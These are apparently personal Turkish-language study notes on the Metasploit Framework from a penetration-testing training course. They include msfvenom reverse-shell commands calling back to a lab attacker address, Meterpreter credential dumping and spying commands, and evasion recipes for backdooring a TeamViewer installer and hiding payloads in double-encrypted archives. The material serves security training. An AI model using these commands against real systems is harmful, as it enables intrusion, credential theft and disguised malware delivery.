[← Tüm modüller](../README.md)

# 09 — Using the Metasploit Framework

HTB CPTS path'inin dokuzuncu modülü için tuttuğum çalışma notları. Konu: **Metasploit Framework'ün derin kullanımı** — modül yapısı/arama, targets, payload tipleri (singles/stagers/stages), encoders, PostgreSQL database + workspaces, plugins/mixins, sessions/jobs, Meterpreter (migration, post-exploit, hashdump), MSFvenom ile payload üretimi ve firewall/IDS evasion (backdoored executable, archive, packer).

> **Not stratejisi:** 08-Shells & Payloads'ta MSF'nin temel workflow'unu gördüm; bu modül **detay** katmanı. O yüzden tekrar eden basic `use/set/exploit`'i kısa tuttum, ağırlığı **arama filtreleri, database/workspace yönetimi, session/job farkı, Meterpreter post-exploit zinciri (migration → local_exploit_suggester → priv-esc → hashdump) ve evasion**e verdim. MSF'te takıldığında dönüp bakılacak referans.

Notlar Türkçe, teknik terimler İngilizce bırakıldı.

> **Felsefe notu (Preface):** Tool = yardımcı, backbone değil. Tunnel vision'a düşme — "tool yapamıyorsa ben de yapamam" tuzağı. Exploit başarısız olması zafiyetin olmadığını değil, **MSF exploit'inin çalışmadığını** gösterir (çoğu exploit hedefe göre customize gerektirir).

---

## İçindekiler

1. [Modül Yapısı & Arama](#1-modül-yapısı--arama)
2. [Targets](#2-targets)
3. [Payload Tipleri — Singles / Stagers / Stages](#3-payload-tipleri--singles--stagers--stages)
4. [Encoders](#4-encoders)
5. [Database & Workspaces](#5-database--workspaces)
6. [Plugins & Mixins](#6-plugins--mixins)
7. [Sessions & Jobs](#7-sessions--jobs)
8. [Meterpreter — Post-Exploitation](#8-meterpreter--post-exploitation)
9. [MSFvenom](#9-msfvenom)
10. [Firewall & IDS/IPS Evasion](#10-firewall--idsips-evasion)
11. [Tek Bakışta Komut Referansı](#11-tek-bakışta-komut-referansı)

---

## 1. Modül Yapısı & Arama

**Modül yolu:** `<type>/<os>/<service>/<name>` (örn. `exploit/windows/ftp/scriptftp_list`)

**Modül tipleri:**
| Tip | İş | `use` ile seçilebilir? |
|---|---|---|
| **Auxiliary** | Scan/fuzz/sniff/admin | ✅ |
| **Exploit** | Zafiyet exploit + payload delivery | ✅ |
| **Post** | Post-exploitation (info gather, pivot) | ✅ |
| Encoders | Payload bütünlüğü + AV evasion | ❌ |
| NOPs | Payload boyutunu sabit tut | ❌ |
| Payloads | Hedefte çalışıp callback | ❌ |
| Plugins | 3rd-party entegrasyon | ❌ |

> Sadece **auxiliary/exploit/post** initiator — `use <no.>` ile seçilir.

**Arama filtreleri (`search`):**
```
search eternalromance                               # basit
search eternalromance type:exploit
search type:exploit platform:windows cve:2021 rank:excellent microsoft
search cve:2009 type:exploit platform:-linux        # - ile dışla
```
Keyword'ler: `cve:`, `edb:` (Exploit-DB ID), `author:`, `arch:`, `platform:`, `port:`, `rank:` (good/excellent veya `gte400`), `type:`, `check:`, `name:`, `path:`.

**Modül kullanımı:**
```
use 0                     # arama sonucundaki index ile seç
use exploit/windows/smb/ms17_010_psexec   # tam yolla
info                      # modül detayı (targets, references, description) — İLK bakılacak
options / show options    # ayarlar (Required=yes olanlar şart)
set RHOSTS 10.10.10.40
setg RHOSTS 10.10.10.40    # GLOBAL — restart'a kadar kalıcı (tek hedefte çalışırken pratik)
run / exploit             # çalıştır
```

---

## 2. Targets

Exploit'in çalışacağı spesifik OS/versiyon tanımı (return address farklı olduğu için). `show targets` ile listele.
```
show targets              # modül seçiliyken
set target 6              # spesifik versiyon seç (örn. "IE 9 on Windows 7")
# Automatic (0) → MSF hedefte service detection yapar
```
> Target farkı: service pack, OS versiyonu, dil paketi → return address değişir (jmp esp, pop/pop/ret). Doğru target için: hedef binary'yi al + `msfpescan` ile return address bul. (Stack-Based BoF modülünde derinleşir.)

---

## 3. Payload Tipleri — Singles / Stagers / Stages

| Tip | Ne | İsim örneği |
|---|---|---|
| **Single (inline)** | Exploit + tüm shellcode tek parça | `windows/shell_bind_tcp` (ayrık `/` YOK) |
| **Stager** | Küçük, callback başlatır, iletişim kanalı kurar | — |
| **Stage** | Stager'ın indirdiği asıl payload (Meterpreter, VNC...) | `windows/shell/bind_tcp` (ayrık `/` VAR) |

> **İsimden ayırt et:** `/` ile ayrık (`shell/bind_tcp`) = staged; birleşik (`shell_bind_tcp`) = single.
> **Reverse > bind:** outbound trafik (security trust zone) genelde daha az filtreli.

**Payload arama (grep ile daralt):**
```
show payloads
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads    # zincirleme grep
grep -c meterpreter show payloads                   # sayı
set payload 15             # index ile seç (exploit seçiliyken → sadece uyumlu olanlar listelenir)
```
Payload seçince yeni option'lar açılır: **LHOST** (attacker IP), **LPORT**.

**Yaygın Windows payload'ları:** `windows/x64/meterpreter/reverse_tcp`, `.../powershell/$`, `.../vncinject/$`, `windows/x64/exec` (komut), `.../messagebox`. (Empire, Cobalt Strike de profesyonel seçenekler.)

---

## 4. Encoders

Payload'ı farklı mimariye uyarla (x86/x64/sparc/ppc/mips) + bad character temizle (örn. `\x00`) + eski AV evasion.

**Shikata Ga Nai (SGN):** eskiden "undetectable" polymorphic XOR encoder; **artık modern AV yakalıyor**. Encoder'ların AV evasion değeri zamanla düştü.

```
show encoders             # modül+payload'a uyumlu olanlar
# msfvenom ile:
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o out.exe
#  -e encoder,  -i iteration (10x encode),  -b bad chars
```
> **Gerçeklik:** tek/çok iterasyon SGN bile VirusTotal'de 51/68 yakalanır. Encoder tek başına AV bypass için yetmez.
> **Test aracı:** `msf-virustotal -k <API key> -f payload.exe` (ücretsiz VT kaydı gerekir).

---

## 5. Database & Workspaces

PostgreSQL ile sonuç takibi (büyük network'te şart).

**Kurulum:**
```bash
sudo systemctl start postgresql
sudo msfdb init           # DB + user oluştur
sudo msfdb status
# msfconsole içinde:
db_status                 # Connected to msf
```

**Workspaces (proje klasörü gibi — IP/subnet/domain'e göre ayır):**
```
workspace                 # listele (* = aktif)
workspace -a Target_1     # ekle
workspace Target_1        # geç
workspace -d <name>       # sil
```

**Scan import + sorgulama:**
```
db_import Target.xml      # Nmap XML import (.xml tercih)
db_nmap -sV -sS 10.10.10.8   # MSF içinden Nmap → otomatik DB'ye yazar
hosts                     # DB'deki host'lar
services                  # servisler
hosts -R                  # RHOSTS'u search sonuçlarından ayarla
db_export -f xml backup.xml   # yedekle
```

**Veri saklama komutları:**
| Komut | Ne |
|---|---|
| `hosts` | host tablosu (IP, OS, mac...) |
| `services` | servis tablosu |
| `creds` | toplanan credential'lar (add/list/delete, NTLM/hash/ssh-key) |
| `loot` | hash dump'lar (SAM, passwd, shadow) |
| `vulns` | zafiyetler |
| `notes` | notlar |

---

## 6. Plugins & Mixins

**Plugins:** 3rd-party entegrasyon (Nessus, NexPose, OpenVAS, Mimikatz). `/usr/share/metasploit-framework/plugins/`
```
load nessus               # plugin yükle → komutları açılır (nessus_help)
# Custom plugin: .rb dosyasını plugins dizinine kopyala → load <name>
# Örn: DarkOperator's pentest.rb → multi-session komutları, network discovery, pivot
```
Popüler: nmap, NexPose, Nessus, Mimikatz, Incognito, Railgun, Priv, Stdapi (çoğu pre-installed).

**Mixins:** Ruby class'ları — inheritance değil **inclusion** (`include`). Bir feature'ı birçok class'a sağlar. Başlangıçta önemsiz, MSF'nin özelleştirme derinliğini gösterir.

---

## 7. Sessions & Jobs

**Session:** aktif modül/shell kontrol arayüzü.
```
# background: [CTRL+Z] veya Meterpreter'da: background / bg
sessions                  # aktif session listesi
sessions -i 1             # session 1'e geç/etkileşim
```
> Background'daki session **çalışmaya devam eder**. Post modülü çalıştırmak için: session'ı background'a al → `search post/...` → `set SESSION 1` → run.

**Job:** background'da çalışan task (session ölse bile devam eder, portu tutar).
```
exploit -j                # exploit'i job olarak çalıştır (listener açık kalır)
jobs -l                   # job listele
jobs -k <id>              # belirli job'ı öldür
jobs -K                   # tüm job'ları öldür
jobs -p <id>              # restart'ta persist
```
> **Fark:** Port lazımsa `[CTRL+C]` yetmez (port kullanımda kalır) → `jobs -k` ile eski job'ı öldür.

---

## 8. Meterpreter — Post-Exploitation

"Swiss army knife" — DLL injection, memory'de resides (diske yazmaz), AES-encrypted iletişim, process migration. **Stealthy + Powerful + Extensible.**

**Çalışma akışı:** stager çalışır → Reflective DLL yüklenir → Meterpreter core AES link kurar → stdapi/priv extension'ları yüklenir.

**Temel komutlar:**
```
getuid                    # kim (whoami Meterpreter'da çalışmaz!)
sysinfo                   # OS/arch
getsystem                 # SYSTEM'e yüksel
hashdump                  # SAM hash dump
lsa_dump_sam / lsa_dump_secrets   # LSA secrets (service cred'leri, DPAPI...)
ps                        # process listesi
migrate <PID>             # başka process'e geç (stealth/stabilite)
steal_token <PID>         # process token'ını çal (örn. NETWORK SERVICE'e geç)
shell                     # native OS shell'e düş
screenshot / keyscan_start / record_mic / webcam_snap   # casusluk
upload / download         # dosya transfer
load <extension>          # extension yükle (kiwi=mimikatz vb.)
bg / background           # session'ı arkaya al
```

### Post-Exploit Zinciri (modülün ana örneği)
```
# 1. Düşük yetkili shell (örn. IIS APPPOOL\Web veya NETWORK SERVICE)
getuid → "Access is denied"

# 2. Token steal ile yetki yükselt
ps → steal_token <PID>    # NT AUTHORITY\NETWORK SERVICE

# 3. Local exploit suggester (priv-esc vektörü bul)
bg                        # session'ı arkaya al
use post/multi/recon/local_exploit_suggester
set SESSION 1 ; run       # → vulnerable exploit listesi

# 4. Önerilen priv-esc exploit'i çalıştır
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1 ; set LHOST tun0 ; run   # → NT AUTHORITY\SYSTEM

# 5. Loot
hashdump / lsa_dump_secrets   # pivot için credential
```
> `local_exploit_suggester` çıktısındaki her exploit %100 kesin değil — sırayla dene. İlki fail ederse (örn. bypassuac IIS user admin değil) sonrakine geç.

---

## 9. MSFvenom

msfpayload + msfencode birleşimi. Standalone payload üretimi (network erişimi olmadan delivery).

```bash
# Temel (format'a göre: exe/elf/aspx/php/raw/js...)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
msfvenom -p linux/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f elf > shell.elf
```
| Flag | Anlamı |
|---|---|
| `-p` | payload |
| `-f` | format |
| `-e` | encoder |
| `-i` | iteration |
| `-b` | bad chars |
| `-a` / `--platform` | arch / platform |
| `-k` | payload'ı ayrı thread'de çalıştır (template ile) |
| `-x` | executable template (backdoor) |
| `-o` | output |

**Multi/handler ile yakalama** (standalone payload callback'i için):
```
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5 ; set LPORT 1337
run
# → payload hedefte çalışınca session gelir
```
> Örnek senaryo: anonymous FTP upload + web root'tan erişim → `.aspx` payload upload → URL'den tetikle → multi/handler yakalar.

---

## 10. Firewall & IDS/IPS Evasion

**Savunma katmanları:** endpoint protection (AV/firewall, host-level) + perimeter protection (edge device, DMZ).
**Security policy detection:** signature-based · heuristic/anomaly · stateful protocol analysis · SOC live-monitoring.

**MSF6'nın yardımı:** Meterpreter AES-encrypted tunnel → network IDS/IPS'i büyük ölçüde atlatır + memory'de resides. Ama **payload diske inince** fingerprint'lenebilir.

### Evasion teknikleri
**1. Backdoored executable (template injection):** payload'ı meşru .exe'ye göm.
```bash
msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=.. LPORT=.. -k -x ~/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/TeamViewer_Setup.exe -i 5
#  -x template,  -k payload ayrı thread (normal program çalışmaya devam eder)
```
> `-k` olsa bile CLI'dan çalıştırılırsa ayrı pencere açılır (session bitene kadar kapanmaz).

**2. Archive + password:** payload'ı şifreli arşivle, uzantıyı sil, tekrar arşivle.
```bash
rar a test.rar -p test.js   # şifreli
mv test.rar test            # uzantı sil
rar a test2.rar -p test     # tekrar arşivle
mv test2.rar test2
# → VirusTotal: 11/59 → 0/49 (çift şifreli arşiv AV signature'ı bypass eder)
```
> Downside: AV dashboard'da "şifreli, taranamadı" uyarısı → admin manuel inceleyebilir.

**3. Packers:** executable compression (payload + decompress kod tek dosya). Çalışınca orijinale döner. UPX, Enigma Protector, MPRESS, Themida, MEW, Morphine.

**4. Exploit coding randomization:** BoF pattern'lerini randomize et (`Offset` switch), obvious NOP sled kullanma → IDS/IPS signature'ını kır. Deploy öncesi sandbox'ta test.

> **Not:** Encoder tek başına yetmez (SGN artık yakalanıyor). Gerçek evasion = template injection + encryption + packer + custom code kombinasyonu. Derin evasion ayrı modül konusu.

---

## 11. Tek Bakışta Komut Referansı

| İş | Komut |
|---|---|
| Modül ara | `search type:exploit platform:windows cve:2021 rank:excellent` |
| Modül seç/bilgi | `use 0` · `info` · `options` |
| Ayar (kalıcı) | `set RHOSTS x` · `setg RHOSTS x` |
| Target | `show targets` · `set target 6` |
| Payload | `grep meterpreter grep reverse_tcp show payloads` · `set payload 15` |
| Çalıştır | `run` / `exploit` / `exploit -j` (job) |
| DB başlat | `sudo msfdb init` · `db_status` |
| Workspace | `workspace -a Target_1` · `workspace Target_1` |
| Nmap (DB'li) | `db_nmap -sV -sS <ip>` · `db_import scan.xml` |
| DB sorgu | `hosts` · `services` · `creds` · `loot` · `vulns` |
| Session | `sessions` · `sessions -i 1` · `bg` |
| Job | `jobs -l` · `jobs -k <id>` |
| Meterpreter | `getuid` · `sysinfo` · `ps` · `migrate <PID>` · `steal_token <PID>` · `hashdump` · `shell` |
| Priv-esc | `use post/multi/recon/local_exploit_suggester` → `set SESSION 1` |
| Payload üret | `msfvenom -p <payload> LHOST= LPORT= -f <format> -o out` |
| Handler | `use multi/handler` → `set payload` → `set LHOST/LPORT` → `run` |
| Evasion | `msfvenom ... -x template.exe -k -e encoder -i N` |
| Plugin | `load nessus` |
| AV test | `msf-virustotal -k <API key> -f payload` |

---

## Kaynaklar

- **HTB Academy** — Using the Metasploit Framework (CPTS path, Module 09)
- **MSF bileşenleri:** msfconsole, msfvenom, msfdb, msf-virustotal, Meterpreter, multi/handler
- **Database:** PostgreSQL, workspaces, db_nmap/db_import/db_export
- **Plugins:** Nessus/NexPose/OpenVAS, DarkOperator's Metasploit-Plugins, Mimikatz
- **Evasion:** template injection, RAR archive, packers (UPX/Themida/MPRESS), SGN encoder
- **Referans:** Metasploit - The Penetration Tester's Guide (No Starch), Rapid7 module docs, PolyPack project

Notlar kişisel çalışma amacıyla tutuldu ve halka açık paylaşıldı.
Hata veya eksik gördüğünüz yerler için issue açabilirsiniz.

[← Tüm modüller](../README.md)
